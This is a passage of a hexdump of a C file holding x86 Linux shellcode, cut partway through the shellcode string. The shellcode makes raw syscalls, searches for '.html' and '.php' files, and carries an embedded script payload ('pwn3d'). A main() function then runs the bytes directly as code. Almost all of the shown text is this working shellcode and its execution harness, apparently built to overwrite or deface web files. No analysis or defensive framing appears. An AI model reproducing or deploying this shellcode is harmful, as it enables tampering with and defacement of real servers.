00002910  30 5c 78 33 31 5c 78 64  62 5c 78 38 39 5c 78 66  |0\x31\xdb\x89\xf|
00002920  33 5c 78 62 30 5c 78 30  36 5c 78 63 64 5c 78 38  |3\xb0\x06\xcd\x8|
00002930  30 5c 78 33 31 5c 78 63  30 5c 78 35 30 5c 78 36  |0\x31\xc0\x50\x6|
00002940  36 5c 78 36 38 5c 78 32  65 5c 78 32 65 22 0d 0a  |6\x68\x2e\x2e"..|
00002950  20 20 20 20 22 5c 78 38  39 5c 78 65 33 5c 78 62  |    "\x89\xe3\xb|
00002960  30 5c 78 30 63 5c 78 63  64 5c 78 38 30 5c 78 63  |0\x0c\xcd\x80\xc|
00002970  39 5c 78 63 33 5c 78 38  64 5c 78 35 34 5c 78 32  |9\xc3\x8d\x54\x2|
00002980  34 5c 78 36 65 5c 78 38  31 5c 78 33 61 5c 78 37  |4\x6e\x81\x3a\x7|
00002990  30 5c 78 37 32 22 0d 0a  20 20 20 20 22 5c 78 36  |0\x72"..    "\x6|
000029a0  66 5c 78 36 33 5c 78 37  34 5c 78 63 36 5c 78 38  |f\x63\x74\xc6\x8|
000029b0  30 5c 78 33 61 5c 78 32  65 5c 78 37 35 5c 78 30  |0\x3a\x2e\x75\x0|
000029c0  35 5c 78 65 39 5c 78 62  63 5c 78 66 66 5c 78 66  |5\xe9\xbc\xff\xf|
000029d0  66 5c 78 66 66 5c 78 38  39 5c 78 64 33 22 0d 0a  |f\xff\x89\xd3"..|
000029e0  20 20 20 20 22 5c 78 38  39 5c 78 65 31 5c 78 33  |    "\x89\xe1\x3|
000029f0  31 5c 78 63 30 5c 78 62  30 5c 78 63 34 5c 78 63  |1\xc0\xb0\xc4\xc|
00002a00  64 5c 78 38 30 5c 78 36  36 5c 78 62 39 5c 78 66  |d\x80\x66\xb9\xf|
00002a10  66 5c 78 65 66 5c 78 36  36 5c 78 62 62 5c 78 66  |f\xef\x66\xbb\xf|
00002a20  66 5c 78 39 66 22 0d 0a  20 20 20 20 22 5c 78 34  |f\x9f"..    "\x4|
00002a30  31 5c 78 34 33 5c 78 38  62 5c 78 34 34 5c 78 32  |1\x43\x8b\x44\x2|
00002a40  34 5c 78 31 30 5c 78 36  36 5c 78 32 31 5c 78 63  |4\x10\x66\x21\xc|
00002a50  38 5c 78 36 36 5c 78 33  39 5c 78 64 38 5c 78 37  |8\x66\x39\xd8\x7|
00002a60  35 5c 78 30 35 5c 78 65  39 5c 78 39 37 22 0d 0a  |5\x05\xe9\x97"..|
00002a70  20 20 20 20 22 5c 78 66  66 5c 78 66 66 5c 78 66  |    "\xff\xff\xf|
00002a80  66 5c 78 33 31 5c 78 63  30 5c 78 35 30 5c 78 38  |f\x31\xc0\x50\x8|
00002a90  33 5c 78 65 63 5c 78 30  31 5c 78 63 36 5c 78 30  |3\xec\x01\xc6\x0|
00002aa0  34 5c 78 32 34 5c 78 32  65 5c 78 38 39 5c 78 64  |4\x24\x2e\x89\xd|
00002ab0  33 5c 78 62 30 22 0d 0a  20 20 20 20 22 5c 78 30  |3\xb0"..    "\x0|
00002ac0  63 5c 78 63 64 5c 78 38  30 5c 78 38 35 5c 78 63  |c\xcd\x80\x85\xc|
00002ad0  30 5c 78 37 35 5c 78 30  61 5c 78 65 38 5c 78 36  |0\x75\x0a\xe8\x6|
00002ae0  35 5c 78 66 66 5c 78 66  66 5c 78 66 66 5c 78 65  |5\xff\xff\xff\xe|
00002af0  39 5c 78 37 39 5c 78 66  66 5c 78 66 66 22 20 0d  |9\x79\xff\xff" .|
00002b00  0a 20 20 20 20 22 5c 78  66 66 5c 78 33 31 5c 78  |.    "\xff\x31\x|
00002b10  63 30 5c 78 38 39 5c 78  64 33 5c 78 33 31 5c 78  |c0\x89\xd3\x31\x|
00002b20  63 39 5c 78 62 31 5c 78  30 32 5c 78 62 30 5c 78  |c9\xb1\x02\xb0\x|
00002b30  32 31 5c 78 63 64 5c 78  38 30 5c 78 38 35 5c 78  |21\xcd\x80\x85\x|
00002b40  63 30 5c 78 37 34 22 0d  0a 20 20 20 20 22 5c 78  |c0\x74"..    "\x|
00002b50  30 35 5c 78 65 39 5c 78  36 34 5c 78 66 66 5c 78  |05\xe9\x64\xff\x|
00002b60  66 66 5c 78 66 66 5c 78  33 31 5c 78 63 30 5c 78  |ff\xff\x31\xc0\x|
00002b70  35 30 5c 78 36 38 5c 78  36 38 5c 78 37 34 5c 78  |50\x68\x68\x74\x|
00002b80  36 64 5c 78 36 63 5c 78  38 33 5c 78 65 63 22 0d  |6d\x6c\x83\xec".|
00002b90  0a 20 20 20 20 22 5c 78  30 31 5c 78 63 36 5c 78  |.    "\x01\xc6\x|
00002ba0  30 34 5c 78 32 34 5c 78  32 65 5c 78 38 39 5c 78  |04\x24\x2e\x89\x|
00002bb0  65 36 5c 78 38 39 5c 78  64 37 5c 78 65 38 5c 78  |e6\x89\xd7\xe8\x|
00002bc0  30 39 5c 78 66 66 5c 78  66 66 5c 78 66 66 5c 78  |09\xff\xff\xff\x|
00002bd0  33 63 5c 78 30 32 22 0d  0a 20 20 20 20 22 5c 78  |3c\x02"..    "\x|
00002be0  37 34 5c 78 31 38 5c 78  33 31 5c 78 63 30 5c 78  |74\x18\x31\xc0\x|
00002bf0  35 30 5c 78 36 38 5c 78  32 65 5c 78 37 30 5c 78  |50\x68\x2e\x70\x|
00002c00  36 38 5c 78 37 30 5c 78  38 39 5c 78 65 36 5c 78  |68\x70\x89\xe6\x|
00002c10  65 38 5c 78 66 36 5c 78  66 65 5c 78 66 66 22 0d  |e8\xf6\xfe\xff".|
00002c20  0a 20 20 20 20 22 5c 78  66 66 5c 78 33 63 5c 78  |.    "\xff\x3c\x|
00002c30  30 32 5c 78 37 34 5c 78  30 35 5c 78 65 39 5c 78  |02\x74\x05\xe9\x|
00002c40  33 30 5c 78 66 66 5c 78  66 66 5c 78 66 66 5c 78  |30\xff\xff\xff\x|
00002c50  65 62 5c 78 30 62 5c 78  35 65 5c 78 65 38 5c 78  |eb\x0b\x5e\xe8\x|
00002c60  62 39 5c 78 66 65 22 0d  0a 20 20 20 20 22 5c 78  |b9\xfe"..    "\x|
00002c70  66 66 5c 78 66 66 5c 78  65 39 5c 78 32 33 5c 78  |ff\xff\xe9\x23\x|
00002c80  66 66 5c 78 66 66 5c 78  66 66 5c 78 65 38 5c 78  |ff\xff\xff\xe8\x|
00002c90  66 30 5c 78 66 66 5c 78  66 66 5c 78 66 66 22 0d  |f0\xff\xff\xff".|
00002ca0  0a 20 20 20 20 2f 2f 20  3c 68 74 6d 6c 3e 3c 73  |.    // <html><s|
00002cb0  63 72 69 70 74 3e 61 6c  65 72 74 28 22 70 77 6e  |cript>alert("pwn|
00002cc0  33 64 22 29 3c 73 63 72  69 70 74 3e 3c 2f 68 74  |3d")<script></ht|
00002cd0  6d 6c 3e 0d 0a 20 20 20  20 22 5c 78 33 63 5c 78  |ml>..    "\x3c\x|
00002ce0  36 38 5c 78 37 34 5c 78  36 64 5c 78 36 63 5c 78  |68\x74\x6d\x6c\x|
00002cf0  33 65 5c 78 33 63 5c 78  37 33 5c 78 36 33 5c 78  |3e\x3c\x73\x63\x|
00002d00  37 32 5c 78 36 39 5c 78  37 30 5c 78 37 34 5c 78  |72\x69\x70\x74\x|
00002d10  33 65 5c 78 36 31 5c 78  36 63 22 0d 0a 20 20 20  |3e\x61\x6c"..   |
00002d20  20 22 5c 78 36 35 5c 78  37 32 5c 78 37 34 5c 78  | "\x65\x72\x74\x|
00002d30  32 38 5c 78 32 32 5c 78  37 30 5c 78 37 37 5c 78  |28\x22\x70\x77\x|
00002d40  36 65 5c 78 33 33 5c 78  36 34 5c 78 32 32 5c 78  |6e\x33\x64\x22\x|
00002d50  32 39 5c 78 33 63 5c 78  37 33 5c 78 36 33 5c 78  |29\x3c\x73\x63\x|
00002d60  37 32 22 0d 0a 20 20 20  20 22 5c 78 36 39 5c 78  |72"..    "\x69\x|
00002d70  37 30 5c 78 37 34 5c 78  33 65 5c 78 33 63 5c 78  |70\x74\x3e\x3c\x|
00002d80  32 66 5c 78 36 38 5c 78  37 34 5c 78 36 64 5c 78  |2f\x68\x74\x6d\x|
00002d90  36 63 5c 78 33 65 22 3b  0d 0a 20 20 20 20 0d 0a  |6c\x3e";..    ..|
00002da0  69 6e 74 20 6d 61 69 6e  28 29 0d 0a 7b 20 20 20  |int main()..{   |
00002db0  0d 0a 20 20 70 72 69 6e  74 66 28 22 25 64 5c 6e  |..  printf("%d\n|
00002dc0  22 2c 20 73 74 72 6c 65  6e 28 73 68 65 6c 6c 63  |", strlen(shellc|
00002dd0  6f 64 65 29 29 3b 0d 0a  20 20 28 2a 28 76 6f 69  |ode));..  (*(voi|
00002de0  64 20 28 2a 29 28 29 29  20 73 68 65 6c 6c 63 6f  |d (*)()) shellco|
00002df0  64 65 29 28 29 3b 0d 0a  20 20 72 65 74 75 72 6e  |de)();..  return|
00002e00  20 30 3b 0d 0a 7d                                 | 0;..}|
00002e06
